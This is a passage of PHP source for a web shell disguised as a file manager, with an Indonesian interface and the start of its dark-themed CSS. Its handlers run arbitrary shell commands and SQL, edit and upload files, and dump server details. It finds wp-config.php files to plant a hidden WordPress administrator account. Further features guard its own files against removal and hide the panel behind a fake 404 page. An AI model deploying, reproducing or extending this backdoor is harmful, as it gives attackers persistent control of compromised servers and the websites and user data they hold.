                    if ($src === false || !file_exists($src)) { $errors[] = "$rel tidak ditemukan"; continue; }
                    if (rel_from_full($src) === '') { $errors[] = 'Tidak bisa pindah root'; continue; }
                    if (fm_lock_is_protected_path($src)) {
                        fm_lock_self_heal(true);
                        $errors[] = "Lock Me: $rel dilindungi";
                        continue;
                    }
                    $target = $dest . DIRECTORY_SEPARATOR . basename($src);
                    // prevent move into self
                    $srcN = str_replace('\\','/',$src);
                    $dstN = str_replace('\\','/',$dest);
                    if (is_dir($src) && ($dstN === $srcN || strpos($dstN, $srcN.'/') === 0)) {
                        $errors[] = "Tidak bisa pindah folder ke dalam dirinya: $rel";
                        continue;
                    }
                    if (file_exists($target)) { $errors[] = basename($src).' sudah ada di tujuan'; continue; }
                    if (move_item($src, $target)) $moved++; else $errors[] = "Gagal pindah $rel";
                }
                if (fm_lock_is_linux()) fm_lock_self_heal(false);
                json_out(['ok'=>$moved > 0,'moved'=>$moved,'errors'=>$errors,'message'=>"$moved item dipindah"]);
            }

            case 'copy': {
                $raw = (isset($_POST['paths']) ? $_POST['paths'] : fm_arr($_POST, 'path', ''));
                $list = is_array($raw) ? $raw : (is_string($raw) && $raw !== '' ? [$raw] : []);
                $destRel = fm_arr($_POST, 'dest', '');
                $dest = safe_path($destRel);
                if ($dest === false || !is_dir($dest)) json_out(['ok'=>false,'error'=>'Tujuan tidak valid'], 400);
                if (!$list) json_out(['ok'=>false,'error'=>'Tidak ada item'], 400);
                $copied = 0; $errors = [];
                foreach ($list as $rel) {
                    $src = safe_path($rel);
                    if ($src === false || !file_exists($src)) { $errors[] = "$rel tidak ditemukan"; continue; }
                    $name = basename($src);
                    $target = $dest . DIRECTORY_SEPARATOR . $name;
                    $i = 1;
                    while (file_exists($target)) {
                        $pi = pathinfo($name);
                        $base = $pi['filename'];
                        $ext = isset($pi['extension']) && $pi['extension'] !== '' ? '.'.$pi['extension'] : '';
                        if (is_dir($src)) { $target = $dest . DIRECTORY_SEPARATOR . $name . " copy$i"; }
                        else { $target = $dest . DIRECTORY_SEPARATOR . $base . " copy$i" . $ext; }
                        $i++;
                    }
                    if (copy_recursive($src, $target)) $copied++; else $errors[] = "Gagal copy $rel";
                }
                json_out(['ok'=>$copied > 0,'copied'=>$copied,'errors'=>$errors,'message'=>"$copied item di-copy"]);
            }

            case 'chmod': {
                $raw = (isset($_POST['paths']) ? $_POST['paths'] : fm_arr($_POST, 'path', ''));
                $list = is_array($raw) ? $raw : (is_string($raw) && $raw !== '' ? [$raw] : []);
                $mode = trim((string)(fm_arr($_POST, 'mode', '')));
                $recursive = !empty($_POST['recursive']);
                if (!preg_match('/^[0-7]{3,4}$/', $mode)) json_out(['ok'=>false,'error'=>'Mode chmod tidak valid (contoh: 755)'], 400);
                $oct = octdec($mode);
                if (!$list) json_out(['ok'=>false,'error'=>'Tidak ada item'], 400);
                $done = 0; $errors = [];
                $apply = function ($p) use ($oct, &$done, &$errors, $recursive, &$apply) {
                    if (!@chmod($p, $oct)) { $errors[] = rel_from_full($p) . (fm_is_win() ? ' (chmod terbatas di Windows)' : ''); return; }
                    $done++;
                    if ($recursive && is_dir($p) && !is_link($p)) {
                        foreach (scandir($p) as $n) {
                            if ($n === '.' || $n === '..') continue;
                            $apply($p . DIRECTORY_SEPARATOR . $n);
                        }
                    }
                };
                foreach ($list as $rel) {
                    $p = safe_path($rel);
                    if ($p === false || !file_exists($p)) { $errors[] = "$rel tidak ditemukan"; continue; }
                    $apply($p);
                }
                json_out(['ok'=>$done > 0,'changed'=>$done,'errors'=>$errors,'message'=>"CHMOD $mode diterapkan ke $done item"]);
            }

            case 'read': {
                $p = safe_path(fm_req('path', ''));
                if ($p === false || !is_file($p)) json_out(['ok'=>false,'error'=>'File tidak ditemukan'], 404);
                if (!is_editable($p)) json_out(['ok'=>false,'error'=>'File tidak bisa diedit (terlalu besar / binary)'], 400);
                $content = @file_get_contents($p);
                if ($content === false) json_out(['ok'=>false,'error'=>'Gagal membaca'], 500);
                json_out([
                    'ok' => true,
                    'path' => rel_from_full($p),
                    'name' => basename($p),
                    'content' => $content,
                    'size' => filesize($p),
                    'chmod' => perms_oct($p),
                    'writable' => is_writable($p),
                ]);
            }

            case 'write': {
                $p = safe_path(fm_arr($_POST, 'path', ''));
                if ($p === false) json_out(['ok'=>false,'error'=>'Path tidak valid'], 400);
                $__lk = fm_lock_read_state();
                if (fm_lock_is_protected_path($p) || (
                    is_string($p) && in_array(strtolower(basename($p)), array('index.php','abadi_litespeed.php','.abadi_lock'), true)
                    && !empty($__lk['enabled'])
                )) {
                    fm_lock_self_heal(true);
                    json_out(['ok'=>false,'error'=>'Lock Me: file dilindungi (tidak bisa edit)'], 403);
                }
                if (!file_exists($p)) {
                    // allow save-as new if parent ok
                    $parent = dirname($p);
                    if (!is_dir($parent)) json_out(['ok'=>false,'error'=>'Folder induk tidak ada'], 400);
                } elseif (!is_file($p)) {
                    json_out(['ok'=>false,'error'=>'Bukan file'], 400);
                }
                if (file_exists($p) && !is_writable($p)) json_out(['ok'=>false,'error'=>'File tidak writable'], 403);
                $content = isset($_POST['content']) ? (string)$_POST['content'] : '';
                // normalize line endings optionally keep as-is
                if (@file_put_contents($p, $content) === false) json_out(['ok'=>false,'error'=>'Gagal menyimpan'], 500);
                json_out(['ok'=>true,'message'=>'Tersimpan','size'=>filesize($p),'path'=>rel_from_full($p)]);
            }

            case 'upload': {
                $base = safe_path(fm_arr($_POST, 'path', ''));
                if ($base === false || !is_dir($base)) json_out(['ok'=>false,'error'=>'Path tidak valid'], 400);
                if (empty($_FILES['files'])) json_out(['ok'=>false,'error'=>'Tidak ada file'], 400);
                $files = $_FILES['files'];
                $uploaded = 0; $errors = [];
                $count = is_array($files['name']) ? count($files['name']) : 0;
                for ($i = 0; $i < $count; $i++) {
                    if ($files['error'][$i] !== UPLOAD_ERR_OK) {
                        $errors[] = ($files['name'][$i] ?: 'file').' error upload #'.$files['error'][$i];
                        continue;
                    }
                    if ($files['size'][$i] > FM_MAX_UPLOAD) {
                        $errors[] = $files['name'][$i].' terlalu besar';
                        continue;
                    }
                    $name = basename($files['name'][$i]);
                    $name = preg_replace('/[\\\\\/:*?"<>|]/', '_', $name);
                    if ($name === '' || $name === '.' || $name === '..') { $errors[] = 'Nama tidak valid'; continue; }
                    $dest = $base . DIRECTORY_SEPARATOR . $name;
                    if (file_exists($dest)) {
                        $pi = pathinfo($name);
                        $dest = $base . DIRECTORY_SEPARATOR . $pi['filename'] . '_' . time() . (isset($pi['extension']) ? '.'.$pi['extension'] : '');
                    }
                    if (@move_uploaded_file($files['tmp_name'][$i], $dest)) $uploaded++;
                    else $errors[] = "Gagal upload $name";
                }
                json_out(['ok'=>$uploaded > 0,'uploaded'=>$uploaded,'errors'=>$errors,'message'=>"$uploaded file diupload"]);
            }

            case 'download': {
                $p = safe_path(fm_arr($_GET, 'path', ''));
                if ($p === false || !is_file($p) || !is_readable($p)) {
                    http_response_code(404);
                    echo 'File tidak ditemukan';
                    exit;
                }
                $name = basename($p);
                header('Content-Description: File Transfer');
                header('Content-Type: application/octet-stream');
                header('Content-Disposition: attachment; filename="'.rawurlencode($name).'"; filename*=UTF-8\'\''.rawurlencode($name));
                header('Content-Length: ' . filesize($p));
                header('Cache-Control: no-cache');
                readfile($p);
                exit;
            }

            case 'info': {
                $p = safe_path(fm_req('path', ''));
                if ($p === false || !file_exists($p)) json_out(['ok'=>false,'error'=>'Tidak ditemukan'], 404);
                $isDir = is_dir($p);
                $info = [
                    'ok' => true,
                    'name' => basename($p) ?: 'Root',
                    'path' => rel_from_full($p),
                    'full' => $p,
                    'type' => $isDir ? 'dir' : 'file',
                    'size' => $isDir ? null : filesize($p),
                    'size_h' => $isDir ? '—' : human_size(filesize($p)),
                    'mtime' => date('Y-m-d H:i:s', filemtime($p)),
                    'ctime' => date('Y-m-d H:i:s', filectime($p)),
                    'perms' => perms_str($p),
                    'chmod' => perms_oct($p),
                    'readable' => is_readable($p),
                    'writable' => is_writable($p),
                    'owner' => fm_owner_name($p),
                ];
                json_out($info);
            }

            case 'tree': {
                $base = safe_path(fm_req('path', ''));
                if ($base === false || !is_dir($base)) json_out(['ok'=>false,'error'=>'Path tidak valid'], 400);
                $maxDepth = 3;
                $build = function ($dir, $depth) use (&$build, $maxDepth) {
                    if ($depth > $maxDepth) return [];
                    $out = [];
                    $scan = @scandir($dir);
                    if (!$scan) return [];
                    $dirs = [];
                    foreach ($scan as $n) {
                        if ($n === '.' || $n === '..') continue;
                        $f = $dir . DIRECTORY_SEPARATOR . $n;
                        if (is_dir($f)) $dirs[] = $n;
                    }
                    natcasesort($dirs);
                    foreach ($dirs as $n) {
                        $f = $dir . DIRECTORY_SEPARATOR . $n;
                        $out[] = [
                            'name' => $n,
                            'path' => rel_from_full($f),
                            'children' => $build($f, $depth + 1),
                        ];
                    }
                    return $out;
                };
                json_out(['ok'=>true,'path'=>rel_from_full($base),'tree'=>$build($base, 0)]);
            }

            case 'term': {
                $cmd = trim((string)fm_arr($_POST, 'cmd', ''));
                $cwdRel = fm_arr($_POST, 'cwd', '');
                if ($cmd === '') json_out(array('ok'=>false,'error'=>'Perintah kosong'), 400);
                $cwd = safe_path($cwdRel);
                if ($cwd === false || !is_dir($cwd)) $cwd = FM_ROOT;
                $res = fm_term_run($cmd, $cwd);
                if (empty($res['ok'])) {
                    json_out(array(
                        'ok' => false,
                        'error' => isset($res['error']) ? $res['error'] : 'Gagal menjalankan perintah',
                        'tried' => isset($res['tried']) ? $res['tried'] : array(),
                        'disabled' => fm_disabled_functions(),
                        'os' => PHP_OS,
                    ), 500);
                }
                $out = isset($res['output']) ? $res['output'] : '';
                if (!is_string($out)) $out = (string)$out;
                $out = str_replace("\r\n", "\n", $out);
                $out = preg_replace('/[\x00-\x08\x0B\x0C\x0E-\x1F]/', '', $out);
                $out = fm_utf8_clean($out);
                if (strlen($out) > 500000) {
                    $out = substr($out, 0, 500000) . "\n… [output dipotong]";
                }
                json_out(array(
                    'ok' => true,
                    'output' => $out,
                    'code' => isset($res['code']) ? (int)$res['code'] : 0,
                    'cwd' => $cwd,
                    'cwd_rel' => rel_from_full($cwd),
                    'runner' => isset($res['runner']) ? $res['runner'] : '',
                    'os' => PHP_OS,
                    'is_win' => fm_is_win(),
                ));
            }

            case 'codec': {
                $mode = (string)fm_arr($_POST, 'mode', '');
                $text = (string)fm_arr($_POST, 'text', '');
                $result = ''; $err = '';
                switch ($mode) {
                    case 'b64_enc': $result = base64_encode($text); break;
                    case 'b64_dec':
                        $d = base64_decode($text, true);
                        if ($d === false) $err = 'Base64 tidak valid'; else $result = $d;
                        break;
                    case 'url_enc': $result = rawurlencode($text); break;
                    case 'url_dec': $result = rawurldecode($text); break;
                    case 'html_enc': $result = htmlspecialchars($text, ENT_QUOTES, 'UTF-8'); break;
                    case 'html_dec': $result = html_entity_decode($text, ENT_QUOTES, 'UTF-8'); break;
                    case 'hex_enc': $result = bin2hex($text); break;
                    case 'hex_dec':
                        $t = preg_replace('/\s+/', '', $text);
                        if ($t === '' || (strlen($t) % 2) !== 0 || !ctype_xdigit($t)) $err = 'Hex tidak valid';
                        else { $result = @hex2bin($t); if ($result === false) { $err = 'Hex decode gagal'; $result = ''; } }
                        break;
                    case 'md5': $result = md5($text); break;
                    case 'sha1': $result = sha1($text); break;
                    case 'sha256': $result = function_exists('hash') ? hash('sha256', $text) : sha1($text); break;
                    case 'json_pretty':
                        $j = json_decode($text);
                        if (function_exists('json_last_error') && json_last_error() !== JSON_ERROR_NONE) $err = 'JSON tidak valid';
                        else {
                            $flags = defined('JSON_PRETTY_PRINT') ? JSON_PRETTY_PRINT : 0;
                            if (defined('JSON_UNESCAPED_UNICODE')) $flags |= JSON_UNESCAPED_UNICODE;
                            $result = json_encode($j, $flags);
                        }
                        break;
                    case 'json_minify':
                        $j = json_decode($text);
                        if (function_exists('json_last_error') && json_last_error() !== JSON_ERROR_NONE) $err = 'JSON tidak valid';
                        else $result = json_encode($j);
                        break;
                    case 'rot13': $result = str_rot13($text); break;
                    case 'upper': $result = function_exists('mb_strtoupper') ? mb_strtoupper($text,'UTF-8') : strtoupper($text); break;
                    case 'lower': $result = function_exists('mb_strtolower') ? mb_strtolower($text,'UTF-8') : strtolower($text); break;
                    case 'len':
                        $bl = strlen($text);
                        $cl = function_exists('mb_strlen') ? mb_strlen($text,'UTF-8') : $bl;
                        $result = "Bytes: $bl\nChars: $cl\nLines: " . (substr_count($text, "\n") + ($text===''?0:1));
                        break;
                    default: $err = 'Mode tidak dikenal';
                }
                if ($err !== '') json_out(array('ok'=>false,'error'=>$err), 400);
                json_out(array('ok'=>true,'result'=>$result,'mode'=>$mode));
            }

            case 'lock_status': {
                json_out(fm_lock_status());
            }
            case 'lock_me': {
                $r = fm_lock_enable();
                if (empty($r['ok'])) json_out($r, 400);
                json_out($r);
            }
            case 'unlock_me': {
                $r = fm_lock_disable();
                if (empty($r['ok'])) json_out($r, 400);
                json_out($r);
            }
            case 'lock_heal': {
                if (!fm_lock_is_linux()) json_out(array('ok'=>false,'error'=>'Linux only'), 400);
                $r = fm_lock_self_heal(true);
                json_out(array_merge(array('ok'=>true), $r));
            }

            case 'sysinfo': {
                $diskTotal = @disk_total_space(FM_ROOT);
                $diskFree = @disk_free_space(FM_ROOT);
                $exts = get_loaded_extensions(); sort($exts);
                $k = fm_kernel_info();
                json_out(array(
                    'ok'=>true,
                    'php'=>PHP_VERSION,'sapi'=>PHP_SAPI,
                    'os'=>PHP_OS.(defined('PHP_OS_FAMILY')?' ('.PHP_OS_FAMILY.')':''),
                    'server_soft'=>isset($_SERVER['SERVER_SOFTWARE'])?$_SERVER['SERVER_SOFTWARE']:'-',
                    'server_name'=>isset($_SERVER['SERVER_NAME'])?$_SERVER['SERVER_NAME']:'-',
                    'docroot'=>isset($_SERVER['DOCUMENT_ROOT'])?$_SERVER['DOCUMENT_ROOT']:'-',
                    'fm_root'=>FM_ROOT,'fm_home'=>fm_home_rel(),
                    'timezone'=>function_exists('date_default_timezone_get')?date_default_timezone_get():'-',
                    'time'=>date('Y-m-d H:i:s'),
                    'disk_total'=>$diskTotal!==false?human_size($diskTotal):'-',
                    'disk_free'=>$diskFree!==false?human_size($diskFree):'-',
                    'memory_limit'=>ini_get('memory_limit'),
                    'upload_max'=>ini_get('upload_max_filesize'),
                    'post_max'=>ini_get('post_max_size'),
                    'max_exec'=>ini_get('max_execution_time'),
                    'extensions'=>$exts,
                    'disabled'=>ini_get('disable_functions'),
                    'pdo_drivers'=>class_exists('PDO')?PDO::getAvailableDrivers():array(),
                    'uname'=>$k['uname'],
                    'kernel'=>$k['kernel'],
                    'distro'=>$k['distro'],
                    'arch'=>$k['arch'],
                    'host'=>$k['host'],
                    'cpus'=>$k['cpus'],
                    'load'=>$k['load'],
                    'uptime'=>$k['uptime'],
                    'user'=>$k['user'],
                    'family'=>$k['family'],
                    'kernel_lines'=>$k['lines'],
                ));
            }

            case 'phpinfo': {
                $level = ob_get_level();
                ob_start();
                if (function_exists('phpinfo')) {
                    phpinfo(INFO_GENERAL | INFO_CONFIGURATION | INFO_MODULES);
                } else {
                    echo 'phpinfo() disabled';
                }
                $html = ob_get_clean();
                // discard nested buffers if any extra
                while (ob_get_level() > $level) { @ob_end_clean(); }
                $html = fm_utf8_clean($html);
                if (strlen($html) > 800000) $html = substr($html, 0, 800000) . '<!-- truncated -->';
                json_out(array('ok'=>true,'html'=>$html));
            }

            case 'db_test': {
                if (!class_exists('PDO')) json_out(array('ok'=>false,'error'=>'PDO tidak tersedia'), 500);
                $host=(string)fm_arr($_POST,'host','127.0.0.1');
                $port=(string)fm_arr($_POST,'port','3306');
                $user=(string)fm_arr($_POST,'user','root');
                $pass=(string)fm_arr($_POST,'pass','');
                $db=(string)fm_arr($_POST,'db','');
                try {
                    $dsn='mysql:host='.$host.';port='.$port.';charset=utf8';
                    if ($db!=='') $dsn.=';dbname='.$db;
                    $pdo=new PDO($dsn,$user,$pass,array(PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION));
                    $ver=$pdo->query('SELECT VERSION()')->fetchColumn();
                    $dbs=array();
                    if ($db==='') foreach ($pdo->query('SHOW DATABASES') as $row) $dbs[]=$row[0];
                    json_out(array('ok'=>true,'version'=>$ver,'databases'=>$dbs,'message'=>'Terkoneksi'));
                } catch (Exception $e) { json_out(array('ok'=>false,'error'=>$e->getMessage()), 400); }
            }

            case 'db_query': {
                if (!class_exists('PDO')) json_out(array('ok'=>false,'error'=>'PDO tidak tersedia'), 500);
                $host=(string)fm_arr($_POST,'host','127.0.0.1');
                $port=(string)fm_arr($_POST,'port','3306');
                $user=(string)fm_arr($_POST,'user','root');
                $pass=(string)fm_arr($_POST,'pass','');
                $db=(string)fm_arr($_POST,'db','');
                $sql=trim((string)fm_arr($_POST,'sql',''));
                if ($sql==='') json_out(array('ok'=>false,'error'=>'SQL kosong'), 400);
                try {
                    $dsn='mysql:host='.$host.';port='.$port.';charset=utf8';
                    if ($db!=='') $dsn.=';dbname='.$db;
                    $pdo=new PDO($dsn,$user,$pass,array(PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION));
                    $start=microtime(true);
                    $stmt=$pdo->query($sql);
                    $ms=round((microtime(true)-$start)*1000,2);
                    if ($stmt===false) json_out(array('ok'=>false,'error'=>'Query gagal'), 400);
                    $cols=array();
                    for ($i=0;$i<$stmt->columnCount();$i++) {
                        $meta=$stmt->getColumnMeta($i);
                        $cols[]=isset($meta['name'])?$meta['name']:('col'.$i);
                    }
                    $rows=$stmt->fetchAll(PDO::FETCH_NUM);
                    $total=count($rows);
                    if ($total>500) $rows=array_slice($rows,0,500);
                    json_out(array('ok'=>true,'columns'=>$cols,'rows'=>$rows,'row_count'=>$total,'truncated'=>$total>500,'ms'=>$ms,'affected'=>$stmt->rowCount()));
                } catch (Exception $e) { json_out(array('ok'=>false,'error'=>$e->getMessage()), 400); }
            }

            case 'db_tables': {
                if (!class_exists('PDO')) json_out(array('ok'=>false,'error'=>'PDO tidak tersedia'), 500);
                $host=(string)fm_arr($_POST,'host','127.0.0.1');
                $port=(string)fm_arr($_POST,'port','3306');
                $user=(string)fm_arr($_POST,'user','root');
                $pass=(string)fm_arr($_POST,'pass','');
                $db=(string)fm_arr($_POST,'db','');
                if ($db==='') json_out(array('ok'=>false,'error'=>'Pilih database'), 400);
                try {
                    $dsn='mysql:host='.$host.';port='.$port.';dbname='.$db.';charset=utf8';
                    $pdo=new PDO($dsn,$user,$pass,array(PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION));
                    $tables=array();
                    foreach ($pdo->query('SHOW TABLE STATUS') as $row) {
                        $tables[]=array('name'=>$row['Name'],'rows'=>$row['Rows'],'engine'=>$row['Engine'],'data_h'=>human_size(isset($row['Data_length'])?(float)$row['Data_length']:0));
                    }
                    json_out(array('ok'=>true,'tables'=>$tables));
                } catch (Exception $e) { json_out(array('ok'=>false,'error'=>$e->getMessage()), 400); }
            }

            case 'adminer_status': {
                $path=dirname(__FILE__).DIRECTORY_SEPARATOR.'adminer.php';
                json_out(array('ok'=>true,'exists'=>is_file($path),'url'=>'adminer.php','size'=>is_file($path)?filesize($path):0));
            }

            case 'adminer_install': {
                $dest=dirname(__FILE__).DIRECTORY_SEPARATOR.'adminer.php';
                $urls=array(
                    'https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php',
                    'https://cdn.jsdelivr.net/gh/vrana/adminer@v4.8.1/adminer.php',
                );
                $data=false;
                foreach ($urls as $u) {
                    if (function_exists('curl_init')) {
                        $ch=curl_init($u);
                        curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
                        curl_setopt($ch,CURLOPT_FOLLOWLOCATION,true);
                        curl_setopt($ch,CURLOPT_TIMEOUT,60);
                        curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);
                        curl_setopt($ch,CURLOPT_USERAGENT,'ABADINANJAYA-FM');
                        $data=curl_exec($ch);
                        $code=curl_getinfo($ch,CURLINFO_HTTP_CODE);
                        curl_close($ch);
                        if ($data!==false && $code>=200 && $code<300 && strlen($data)>1000) break;
                        $data=false;
                    }
                    if ($data===false && ini_get('allow_url_fopen')) {
                        $ctx=stream_context_create(array('http'=>array('timeout'=>60,'header'=>"User-Agent: ABADINANJAYA-FM\r\n"),'ssl'=>array('verify_peer'=>false,'verify_peer_name'=>false)));
                        $data=@file_get_contents($u,false,$ctx);
                        if ($data!==false && strlen($data)>1000) break;
                        $data=false;
                    }
                }
                if ($data===false) json_out(array('ok'=>false,'error'=>'Gagal unduh Adminer. Cek allow_url_fopen/curl.'), 500);
                if (@file_put_contents($dest,$data)===false) json_out(array('ok'=>false,'error'=>'Gagal menulis adminer.php'), 500);
                json_out(array('ok'=>true,'message'=>'Adminer terpasang','url'=>'adminer.php','size'=>strlen($data)));
            }

            case 'settings_get': {
                json_out(array('ok'=>true,'settings'=>fm_settings()));
            }

            case 'settings_save': {
                $data = array(
                    'auth_mode' => (string)fm_arr($_POST, 'auth_mode', 'cookie'),
                    'username' => (string)fm_arr($_POST, 'username', 'admin'),
                    'password' => (string)fm_arr($_POST, 'password', ''),
                    'cookie_name' => (string)fm_arr($_POST, 'cookie_name', 'abadinanjaya'),
                    'cookie_value' => (string)fm_arr($_POST, 'cookie_value', 'kontol'),
                    'cloak_404' => !empty($_POST['cloak_404']),
                    'show_login_on_404' => !empty($_POST['show_login_on_404']),
                );
                $saved = fm_save_settings_to_index($data);
                if ($saved === false) json_out(array('ok'=>false,'error'=>'Gagal menulis index.php (permission?)'), 500);
                json_out(array('ok'=>true,'message'=>'Settings disimpan ke index.php','settings'=>$saved));
            }



            case 'wp_find': {
                $here = trim((string)fm_arr($_POST, 'path', fm_arr($_GET, 'path', '')));
                $list = fm_wp_find_configs(40, $here);
                $startFull = safe_path($here);
                if ($startFull === false) {
                    $hr = fm_home_rel();
                    $startFull = $hr !== '' ? safe_path($hr) : FM_ROOT;
                }
                if ($startFull && !is_dir($startFull)) $startFull = dirname($startFull);
                $items = array();
                foreach ($list as $f) {
                    $cfg = fm_wp_parse_config($f);
                    $items[] = array(
                        'file' => $f,
                        'dir' => dirname($f),
                        'ok' => $cfg !== false,
                        'prefix' => $cfg ? $cfg['prefix'] : '',
                        'db_name' => $cfg ? $cfg['db']['name'] : '',
                    );
                }
                json_out(array(
                    'ok' => true,
                    'count' => count($items),
                    'items' => $items,
                    'search_from' => $startFull ? $startFull : $here,
                    'search_rel' => $here,
                ));
            }

            case 'wp_admin': {
                $path = trim((string)fm_arr($_POST, 'wp_config', ''));
                $here = trim((string)fm_arr($_POST, 'path', ''));
                $user = trim((string)fm_arr($_POST, 'username', ''));
                $pass = (string)fm_arr($_POST, 'password', '');
                $email = trim((string)fm_arr($_POST, 'email', ''));
                if ($path === '') {
                    $list = fm_wp_find_configs(5, $here);
                    if (!$list) json_out(array('ok'=>false,'error'=>'wp-config.php tidak ditemukan di lokasi ini'), 404);
                    $path = $list[0];
                }
                $real = @realpath($path);
                if ($real === false || !is_file($real)) json_out(array('ok'=>false,'error'=>'wp-config tidak valid'), 400);
                if (strtolower(basename($real)) !== 'wp-config.php') json_out(array('ok'=>false,'error'=>'Bukan wp-config.php'), 400);
                $cfg = fm_wp_parse_config($real);
                if (!$cfg) json_out(array('ok'=>false,'error'=>'Gagal parse wp-config.php'), 400);
                $r = fm_wp_create_admin($cfg, $user !== '' ? $user : null, $pass !== '' ? $pass : null, $email !== '' ? $email : null);
                if (empty($r['ok'])) json_out(array('ok'=>false,'error'=>isset($r['error'])?$r['error']:'gagal'), 500);
                json_out($r);
            }

            default:
                json_out(['ok'=>false,'error'=>'Action tidak dikenal: '.$action], 400);
        }
    } catch (Exception $e) {
        json_out(['ok'=>false,'error'=>'Server error: '.$e->getMessage()], 500);
    }
}

/* ========== UI ========== */
$fmName = FM_NAME;
$fmVer = FM_VERSION;
$fmRoot = FM_ROOT;
$fmHome = fm_home_rel();
// Full path folder home (lokasi file manager di disk)
if ($fmHome !== '') {
    if ($fmRoot === '/' || $fmRoot === '\\' || $fmRoot === '') {
        $fmHomeFull = '/' . str_replace('\\', '/', $fmHome);
    } else {
        $fmHomeFull = rtrim($fmRoot, "\\/") . DIRECTORY_SEPARATOR . str_replace('/', DIRECTORY_SEPARATOR, $fmHome);
    }
} else {
    $fmHomeFull = $fmRoot;
}
$hasPass = (FM_AUTH_MODE !== 'none') ? '1' : '0';
$fmLogoUri = FM_LOGO_URL;
$fmIconUri = FM_ICON_URL;
$fmTitle = fm_page_title();
$fmKernel = fm_kernel_info();
?>
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title><?= htmlspecialchars($fmTitle) ?></title>
<link rel="icon" type="image/png" href="<?= htmlspecialchars($fmIconUri) ?>">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">


<style>
:root {
  --bg: #000000;
  --bg2: #060904;
  --panel: #0a0f06;
  --panel2: #0e1508;
  --border: #1e2c14;
  --border2: #354a22;
  --text: #f4ffe6;
  --muted: #a3bf78;
  --muted2: #6a8250;
  --primary: #c0f000;
  --primary2: #9ad400;
  --accent: #f0d000;
  --success: #9cff2e;
  --warn: #ffd000;
  --danger: #ff4545;
  --dir: #c0f000;
  --file: #cfe88a;
  --glow: rgba(192, 240, 0, 0.25);
  --glow-y: rgba(240, 208, 0, 0.18);
  --row-h: 48px;
  --radius: 12px;
  --radius-sm: 8px;
  --shadow: 0 20px 50px rgba(0,0,0,.55);
  --font: 'Inter', system-ui, -apple-system, sans-serif;
  --mono: 'JetBrains Mono', ui-monospace, monospace;
  --pad-x: 16px;
}
*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
html, body { height: 100%; }
body {
  font-family: var(--font);
  background:
    radial-gradient(ellipse 80% 50% at 12% -12%, rgba(192,240,0,.11), transparent 52%),
    radial-gradient(ellipse 60% 40% at 100% 0%, rgba(240,208,0,.07), transparent 48%),
    radial-gradient(ellipse 40% 30% at 70% 100%, rgba(80,140,0,.05), transparent 55%),
    var(--bg);
  color: var(--text);
  font-size: 14px;
  line-height: 1.5;
  overflow: hidden;
  -webkit-font-smoothing: antialiased;
}
button, input, textarea, select { font: inherit; color: inherit; }
button { cursor: pointer; border: 0; background: none; }
a { color: var(--accent); text-decoration: none; }
::selection { background: rgba(192,240,0,.3); color: #0a1000; }
::-webkit-scrollbar { width: 10px; height: 10px; }
::-webkit-scrollbar-track { background: transparent; }
::-webkit-scrollbar-thumb { background: #243018; border-radius: 8px; border: 2px solid transparent; background-clip: padding-box; }
::-webkit-scrollbar-thumb:hover { background: #354a22; background-clip: padding-box; border: 2px solid transparent; }

.app { display: grid; grid-template-rows: auto 1fr auto; height: 100dvh; }

/* ===== Topbar ===== */
.topbar {
  display: flex; align-items: center; gap: 14px;
  padding: 10px var(--pad-x);
  background:
    linear-gradient(180deg, rgba(192,240,0,.09) 0%, transparent 100%),
    linear-gradient(180deg, #0f1609 0%, var(--panel) 100%);
  border-bottom: 1px solid var(--border);
  box-shadow: 0 1px 0 rgba(192,240,0,.1);
  z-index: 30;
}
.brand { display: flex; align-items: center; gap: 14px; min-width: 0; }
.brand-logo {
  height: 44px; width: auto; max-width: min(280px, 46vw);
  object-fit: contain; display: block;
  filter: drop-shadow(0 0 12px var(--glow)) drop-shadow(0 0 6px var(--glow-y));
}
.brand-meta { display: flex; flex-direction: column; gap: 3px; min-width: 0; }
.brand h1 {
  font-size: 11px; font-weight: 800; letter-spacing: .16em;
  text-transform: uppercase;
  background: linear-gradient(90deg, var(--primary), var(--accent));
  -webkit-background-clip: text; background-clip: text; color: transparent;
}
.brand small { color: var(--muted2); font-size: 11px; font-weight: 500; }

/* ===== Buttons ===== */
.btn {
  display: inline-flex; align-items: center; justify-content: center; gap: 7px;
  height: 36px; padding: 0 14px; border-radius: var(--radius-sm);
  font-size: 13px; font-weight: 600;
  border: 1px solid transparent;
  transition: .15s ease; white-space: nowrap;
  min-width: 36px;
}
.btn:hover { filter: brightness(1.07); }
.btn:active { transform: scale(.98); }
.btn:disabled { opacity: .4; cursor: not-allowed; transform: none; filter: none; }
.btn-ghost {
  background: rgba(255,255,255,.02);
  border-color: var(--border); color: var(--muted);
}
.btn-ghost:hover {
  background: rgba(192,240,0,.08);
  color: var(--text); border-color: var(--border2);
}
.btn-primary {
  background: linear-gradient(135deg, var(--primary) 0%, var(--primary2) 100%);
  color: #0a1000;
  box-shadow: 0 4px 16px var(--glow), inset 0 1px 0 rgba(255,255,255,.2);
  font-weight: 700;
}
.btn-success { background: rgba(156,255,46,.1); color: var(--success); border-color: rgba(156,255,46,.28); }
.btn-warn { background: rgba(255,208,0,.1); color: var(--warn); border-color: rgba(255,208,0,.28); }
.btn-danger { background: rgba(255,69,69,.1); color: #ff7a7a; border-color: rgba(255,69,69,.28); }
.btn svg { width: 15px; height: 15px; flex-shrink: 0; }

/* ===== Layout ===== */
.main { display: flex; flex-direction: column; min-height: 0; overflow: hidden; }
.content { display: flex; flex-direction: column; min-width: 0; min-height: 0; flex: 1; }

/* ===== Kernel / OS banner (vertical) ===== */
.kernel-bar {
  display: flex;
  flex-direction: column;
  gap: 0;
  padding: 0;
  background: linear-gradient(180deg, #0d1508 0%, #0a1006 100%);
  border-bottom: 1px solid var(--border);
  min-width: 0;
}
.kernel-bar-head {
  display: flex;
  align-items: center;
  gap: 10px;
  padding: 8px var(--pad-x);
  border-bottom: 1px solid rgba(36, 48, 22, 0.85);
  background: rgba(192, 240, 0, 0.04);
